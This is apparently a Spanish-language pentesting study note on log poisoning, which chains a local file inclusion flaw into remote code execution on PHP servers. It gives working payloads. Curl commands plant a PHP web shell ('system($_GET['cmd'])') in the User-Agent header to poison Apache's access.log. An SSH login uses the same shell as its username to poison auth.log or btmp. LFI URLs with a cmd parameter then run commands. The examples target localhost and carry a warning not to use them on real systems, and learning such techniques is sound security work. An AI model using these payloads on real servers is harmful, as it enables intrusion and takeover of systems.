# Log Poisoning (LFI -> RCE)

Tags: #LFI #OWASP #Explotacion #RCE #PHP 

**Log Poisoning** es una técnica en la que un atacante **manipula archivos de registro (logs)** de una aplicación con el fin de ejecutar código malicioso.  
Combinado con una vulnerabilidad de **Local File Inclusion (LFI)**, puede llevar a una **Remote Code Execution (RCE)** en el servidor.

### Funcionamiento

1. El atacante explota un **LFI** para acceder a archivos de log.
2. Inyecta **código malicioso** en campos que son registrados en dichos logs.
3. Cuando el archivo de log es interpretado (ej. como PHP), el código se ejecuta.

### Ejemplos

- **SSH (auth.log / btmp)**
    - Inyectar código PHP en el campo **usuario** al autenticarse.
    - El código queda grabado en el log y se ejecuta al ser incluido vía LFI.

- **Apache (access.log)**
    - Inyectar código PHP en el campo **User-Agent** de una petición HTTP.
    - El código malicioso se registra en `access.log` y se ejecuta al ser leído por el LFI.

### Consideraciones

- El nombre de los archivos de log puede variar según el sistema:
    - Debian/Ubuntu → `auth.log`
    - Red Hat/CentOS → `btmp`
- Esto puede requerir pruebas para ubicar los logs correctos.

## Mirar logs en Apache

```shell 
❯ /var/log/apache2/access.log            # Archivo de logs en Apache por consola  
```

```shell
❯ ?file=/var/log/apache2/access.log      # Mirar logs por web 


Notas:
	1. Ruta típica de logs de Apache para ver logs, incluyendo los del 'User Agent ('Mozilla/5.0 (Windows NT...)')' 
	2. 'User Agent': Es un campo del protocolo HTTP que puede utilizarse para transmitir información más o menos detallada sobre el dispositivo de consulta que tramita la solicitud
```

```bash 
# Hacer la solicitud a la web y mirar los logs del 'User-Agent' desde Kali 

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"
	# H = Cabecera a modificar
```

## Inyección de comandos 

```shell
# Se puede inyectar comandos si es una página en PHP. La función 'system' debe de estar habilitada. Para saberlo usar el siguiente comando:

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Mirar el phpinfo en la web y filtrar por 'disable_functions' para verificar que no este la función 'system' ahí 


Notas:
	1. No hacerlo en un entorno real
```

```shell
# Ejecutar un comando desde la cabecera 'User Agent'
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"  
```

```shell
# Controlar la ejecución del comando
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
	# Escapar el $ para evitar conflictos 

Notas:
	1. index.php?filename=/var/log/apache2/access.log&cmd=whoami    # Colocar '&cmd=' para ejecutar comandos 
```

## Log Poisoning SSH

```shell 
❯ /var/log/btmp       # Ruta para ver logs en ssh si se tiene permisos 
``` 

```shell
❯ cat btmp            # Mirar logs en SSH
❯ cat auth.log 
```

```shell
❯ ssh test@IP         # Autenticar con ssh
```

```shell
❯ ssh '<?php system($_GET["cmd"]); ?>'@IP


Notas:
	1. Se puede controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
	2. En ?file=/var/log/btmp&cmd=whoami    # Colocar '&cmd=' para ejecutar comandos 
```